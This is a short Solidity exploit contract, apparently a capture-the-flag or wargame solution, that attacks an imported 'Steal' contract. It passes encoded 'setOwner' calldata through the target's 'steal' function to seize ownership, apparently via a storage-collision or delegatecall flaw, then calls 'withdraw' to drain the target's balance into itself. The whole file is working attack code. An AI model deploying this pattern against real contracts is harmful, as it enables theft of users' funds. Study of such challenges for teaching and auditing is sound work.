// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../src/Steal.sol";

contract StealAttack {
    address private owner;

    function setOwner(address _owner) public {
        owner = _owner;
    }

    function attack(address _steal) public {
        Steal steal = Steal(_steal);

        steal.steal(address(this), abi.encodeWithSignature("setOwner(address)", address(this)));
        steal.withdraw();
    }

    receive() external payable {}
}
